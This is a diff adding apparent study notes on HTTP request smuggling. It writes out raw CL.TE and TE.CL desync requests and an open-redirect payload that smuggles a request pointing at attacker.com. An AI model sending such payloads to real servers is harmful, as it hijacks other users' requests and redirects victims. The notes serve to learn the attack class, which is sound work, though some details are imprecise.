@@ -157,11 +157,74 @@
 <details>
 	<summary>HTTP Request Smuggling</summary>
 
-	
+	https://deepstrike.io/blog/what-is-http-request-smuggling
 
+    Attack Types: 
+    -------------
+    
+	1- CL.TE: The attacker adds both CL-[Content-Length] & TE-[Transfer-Encoding]
+ 	        --------------------------------
+	   	|	POST / HTTP/1.1
+	   	|	Host: vuln.target.com
+	     	|	Content-Length: 6
+	       	|	Transfer-Encoding: chunked
+		|	
+	  	|	0\r\n
+	    	|	\r\n
+	      	|	G
+		--------------------------------
+	- Front-end deal with CL &&& Back-end deal with TE
+	RESPONSE : then the victim do a normal request but the last content appears in this request
+ 		--------------------------------
+	   	|	GPOST / HTTP/1.1
+	   	|	Host: normal.target.com
+		--------------------------------
 
+	------------------------------------------------------------------------------------------------------------------
+	2- TE.CL :
 
+		 --------------------------------
+	   	|	POST / HTTP/1.1
+	   	|	Host: vuln.target.com
+	     	|	Content-Length: 3
+	       	|	Transfer-Encoding: chunked
+		|	
+	  	|	8
+	    	|	SMUGGLED
+	      	|	0
+		--------------------------------
+ 
+ 	- Fron-end deal with TE && Back-end deal with CL
+  	RESPONSE: 
+   		--------------------------------
+	   	|	SMUGGLED
+     		|	0
+     		|	POST / HTTP/1.1
+	   	|	Host: normal.target.com
+		--------------------------------
+	------------------------------------------------------------------------------------------------------------------
 
+    Exploits: 
+    ---------	
+     1- Open Redirect:
+       		 --------------------------------
+	   	|	POST / HTTP/1.1
+	   	|	Host: victim.com
+	     	|	Content-Length: 117
+	       	|	Transfer-Encoding: chunked
+		|	
+	  	|	0 
+    		|	
+	    	|	GET / HTTP/1.1
+      		|	Host: attacker.com
+	 	|	Content-Type: application/x-www-form-urlencoded
+   		|	Content-Length: 10
+      		|
+	      	|	x=
+		|
+		--------------------------------
+
+ 	---------------------------------------------------------------------------------
 
 
 
